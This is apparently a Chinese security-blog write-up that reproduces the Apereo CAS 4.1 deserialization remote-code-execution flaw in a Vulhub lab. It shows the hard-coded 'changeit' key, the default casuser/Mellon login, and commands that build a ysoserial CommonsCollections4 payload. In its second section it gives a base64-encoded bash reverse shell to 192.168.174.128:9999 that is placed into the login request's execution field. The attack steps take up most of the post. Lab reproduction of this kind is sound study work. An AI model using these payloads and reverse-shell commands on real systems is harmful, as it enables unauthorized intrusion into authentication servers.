---
title: "Apereo CAS 4.1 反序列化命令执行漏洞"
date: 2026-10-14 09:04:15
categories:
  - WebSecurity
  - CVE
  - "中间件"
  - "Apereo-CAS"
tags:
  - "Apereo-CAS"
  - "命令执行"
  - "反序列化"
  - "漏洞复现"
---
## 漏洞描述

Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。

参考链接：

- https://apereo.github.io/2016/04/08/commonsvulndisc/

## 环境搭建

Vulhub执行如下命令启动一个Apereo CAS 4.1.5：

```
docker-compose up -d
```

环境启动后，访问`http://your-ip:8080/cas/login`即可查看到登录页面。

## 漏洞复现

### 写入文件

漏洞原理实际上是Webflow中使用了默认密钥`changeit`：

```
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...
```

使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack)来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/awesome_poc"
```

![image-20220223143747931](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202202231437193.png)

然后登录Apereo CAS并抓包（默认用户名/密码为casuser/Mellon），将Body中的`execution`值替换成上面生成的Payload发送：

![image-20220221163417155](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202202211634315.png)

登录Apereo CAS，touch /tmp/success已成功执行：

![image-20220221163608606](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202202211636651.png)

### 写入反弹shell

构造反弹shell并进行base64编码

```
bash -i >& /dev/tcp/192.168.174.128/9999 0>&1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
```

![image-20220223143714661](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202202231437964.png)

监听端口，成功反弹shell

![image-20220221164026966](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202202211640018.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Apereo-CAS-4.1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
